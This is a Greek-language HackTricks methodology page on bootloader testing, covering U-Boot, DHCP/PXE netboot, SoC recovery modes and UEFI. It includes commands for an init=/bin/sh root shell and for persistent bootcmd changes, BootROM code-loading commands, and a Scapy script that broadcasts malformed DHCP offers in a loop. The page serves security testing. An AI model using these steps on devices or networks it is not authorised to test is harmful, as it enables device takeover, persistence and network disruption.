# Bootloader Testing

{{#include ../../banners/hacktricks-training.md}}

Οι παρακάτω ενέργειες συνιστώνται για την τροποποίηση των ρυθμίσεων εκκίνησης της συσκευής και τη δοκιμή bootloaders όπως U-Boot και UEFI-class loaders. Επικεντρωθείτε στο να αποκτήσετε πρώιμη code execution, στην αξιολόγηση των signature/rollback protections και στην κατάχρηση των recovery ή network-boot μονοπατιών.

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot quick wins and environment abuse

1. Πρόσβαση στο interpreter shell
- Κατά την εκκίνηση, πατήστε ένα γνωστό break key (συχνά οποιοδήποτε πλήκτρο, 0, space, ή μια board-specific "magic" ακολουθία) πριν εκτελεστεί το `bootcmd` για να μεταβείτε στο U-Boot prompt.

2. Επιθεώρηση της κατάστασης εκκίνησης και μεταβλητών
- Χρήσιμες εντολές:
- `printenv` (dump environment)
- `bdinfo` (board info, memory addresses)
- `help bootm; help booti; help bootz` (supported kernel boot methods)
- `help ext4load; help fatload; help tftpboot` (available loaders)

3. Τροποποίηση boot arguments για να πάρετε root shell
- Προσθέστε `init=/bin/sh` ώστε ο kernel να πέσει σε shell αντί για το κανονικό init:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot από τον TFTP server σας
- Διαμορφώστε το δίκτυο και τραβήξτε ένα kernel/fit image από το LAN:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Διατήρηση αλλαγών μέσω του environment
- Αν ο env storage δεν είναι write-protected, μπορείτε να διατηρήσετε τον έλεγχο:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Ελέγξτε μεταβλητές όπως `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` που επηρεάζουν fallback paths. Λανθασμένες τιμές μπορεί να δώσουν επαναλαμβανόμενες διακοπές στο shell.

6. Έλεγχος για debug/unsafe λειτουργίες
- Ψάξτε για: `bootdelay` > 0, `autoboot` disabled, unrestricted `usb start; fatload usb 0:1 ...`, δυνατότητα `loady`/`loads` μέσω serial, `env import` από μη αξιόπιστα μέσα, και kernels/ramdisks φορτωμένα χωρίς signature checks.

7. U-Boot image/verification testing
- Αν η πλατφόρμα ισχυρίζεται secure/verified boot με FIT images, δοκιμάστε unsigned και tampered images:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Η απουσία `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` ή η legacy συμπεριφορά `verify=n` συχνά επιτρέπει το booting arbitrary payloads.

## Network-boot surface (DHCP/PXE) and rogue servers

8. PXE/DHCP parameter fuzzing
- Η legacy BOOTP/DHCP επεξεργασία του U-Boot είχε ζητήματα memory-safety. Για παράδειγμα, το CVE‑2024‑42040 περιγράφει memory disclosure μέσω crafted DHCP responses που μπορούν να leak bytes από τη μνήμη του U-Boot πίσω στο δίκτυο. Διερευνήστε τα DHCP/PXE code paths με υπερβολικά μεγάλα/edge-case values (option 67 bootfile-name, vendor options, file/servername fields) και παρατηρήστε για hangs/leaks.
- Minimal Scapy snippet για να πιέσετε τα boot parameters κατά το netboot:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Επίσης επικυρώστε αν τα PXE filename fields περνάνε στην shell/loader λογική χωρίς sanitization όταν αλυσσοδένονται σε OS-side provisioning scripts.

9. Rogue DHCP server command injection testing
- Στήστε έναν rogue DHCP/PXE service και δοκιμάστε να εισάγετε χαρακτήρες σε filename ή options fields για να φτάσετε command interpreters στα επόμενα στάδια του boot chain. Το Metasploit’s DHCP auxiliary, `dnsmasq`, ή custom Scapy scripts λειτουργούν καλά. Βεβαιωθείτε ότι απομονώνετε πρώτα το lab network.

## SoC ROM recovery modes that override normal boot

Πολλά SoC εκθέτουν ένα BootROM "loader" mode που θα δεχτεί code μέσω USB/UART ακόμα και όταν τα flash images είναι invalid. Αν τα secure-boot fuses δεν έχουν καεί, αυτό μπορεί να παρέχει arbitrary code execution πολύ νωρίς στην αλυσίδα.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) or `imx-usb-loader`.
- Παράδειγμα: `imx-usb-loader u-boot.imx` για να ωθήσετε και να τρέξετε custom U-Boot από RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Παράδειγμα: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` ή `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Παράδειγμα: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` για staging ενός loader και uploading custom U-Boot.

Αξιολογήστε αν η συσκευή έχει secure-boot eFuses/OTP καμένες. Αν όχι, τα BootROM download modes συχνά παρακάμπτουν οποιονδήποτε υψηλότερου επιπέδου έλεγχο (U-Boot, kernel, rootfs) εκτελώντας το first-stage payload σας απευθείας από SRAM/DRAM.

## UEFI/PC-class bootloaders: quick checks

10. ESP tampering and rollback testing
- Mountάρετε την EFI System Partition (ESP) και ελέγξτε για loader components: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo paths.
- Δοκιμάστε να κάνετε boot με downgraded ή γνωστά-ευάλωτα signed boot components αν οι Secure Boot revocations (dbx) δεν είναι ενημερωμένες. Αν η πλατφόρμα εξακολουθεί να εμπιστεύεται παλιά shims/bootmanagers, συχνά μπορείτε να φορτώσετε τον δικό σας kernel ή `grub.cfg` από το ESP για να αποκτήσετε persistence.

11. Boot logo parsing bugs (LogoFAIL class)
- Πολλά OEM/IBV firmwares ήταν ευάλωτα σε image-parsing flaws στο DXE που επεξεργάζονται boot logos. Αν ένας attacker μπορεί να τοποθετήσει ένα crafted image στο ESP κάτω από vendor-specific path (π.χ., `\EFI\<vendor>\logo\*.bmp`) και να κάνει reboot, code execution κατά την πρώιμη εκκίνηση μπορεί να είναι εφικτή ακόμα και με ενεργοποιημένο Secure Boot. Ελέγξτε αν η πλατφόρμα δέχεται user-supplied logos και αν αυτά τα paths είναι writable από το OS.

## Hardware caution

Να είστε προσεκτικοί όταν αλληλεπιδράτε με SPI/NAND flash κατά την πρώιμη εκκίνηση (π.χ., γειώνοντας pins για να παρακάμψετε reads) και συμβουλευτείτε πάντα το flash datasheet. Λανθασμένα timed shorts μπορούν να καταστρέψουν τη συσκευή ή το programmer.

## Notes and additional tips

- Δοκιμάστε `env export -t ${loadaddr}` και `env import -t ${loadaddr}` για να μεταφέρετε environment blobs μεταξύ RAM και storage; ορισμένες πλατφόρμες επιτρέπουν εισαγωγή env από removable media χωρίς authentication.
- Για persistence σε Linux-based συστήματα που bootάρουν μέσω `extlinux.conf`, η τροποποίηση της γραμμής `APPEND` (για εισαγωγή `init=/bin/sh` ή `rd.break`) στο boot partition συχνά είναι επαρκής όταν δεν εφαρμόζονται signature checks.
- Αν το userland παρέχει `fw_printenv/fw_setenv`, επικυρώστε ότι το `/etc/fw_env.config` ταιριάζει με το πραγματικό env storage. Misconfigured offsets επιτρέπουν ανάγνωση/εγγραφή της λάθος MTD περιοχής.

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
